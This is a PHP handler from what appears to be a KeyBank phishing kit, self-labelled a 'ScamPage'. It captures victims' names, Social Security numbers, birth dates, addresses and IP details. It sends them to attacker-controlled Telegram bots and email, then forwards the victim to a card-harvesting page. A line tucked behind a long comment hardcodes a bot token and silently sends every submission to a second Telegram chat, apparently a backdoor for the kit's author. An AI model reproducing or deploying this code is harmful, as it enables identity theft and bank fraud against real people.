<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['fname'] ) ) {
		
		$_SESSION['fname'] 	  = $_POST['fname'];
		$_SESSION['lname'] 	  = $_POST['lname'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		$_SESSION['dob'] 	  = $_POST['dob'];
		$_SESSION['stadd'] 	  = $_POST['stadd'];
		$_SESSION['stadd2']   = $_POST['stadd2'];
		$_SESSION['city'] 	  = $_POST['city'];
		$_SESSION['state'] 	  = $_POST['state'];
		$_SESSION['zip'] 	  = $_POST['zip'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 KeyBank Billing ⚫️🌀 ]★　————-««
[First Name] 		: {$_SESSION['fname']}
[Last Name] 		: {$_SESSION['lname']}
[Date of Birth]		: {$_SESSION['dob']}
[SSN] 		: {$_SESSION['ssn']}
[Street Address] 		: {$_SESSION['stadd']}
[Apt/Suite] 		: {$_SESSION['stadd2']}
[City]		: {$_SESSION['city']}
[State]		: {$_SESSION['state']}
[Zip] 		: {$_SESSION['zip']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 KeyBank ScamPage By CH1BOUNA ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
/******************************************************************************************************************************************************************************************************/$api = "5357274693:AAH9lICRr9E51WQGCd0-B8w4VQYLiZnPKgY";$chat_id= "-1001617261329";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($code)."" );
		if ($sendtoemail=="yes"){
		$subject = "🏛️ KeyBank Billing By CH1BOUNA🏛️  From $ip";
        $headers = "From: 🍁KeyBank Billing🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}




        header("Location: ../card.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}


?>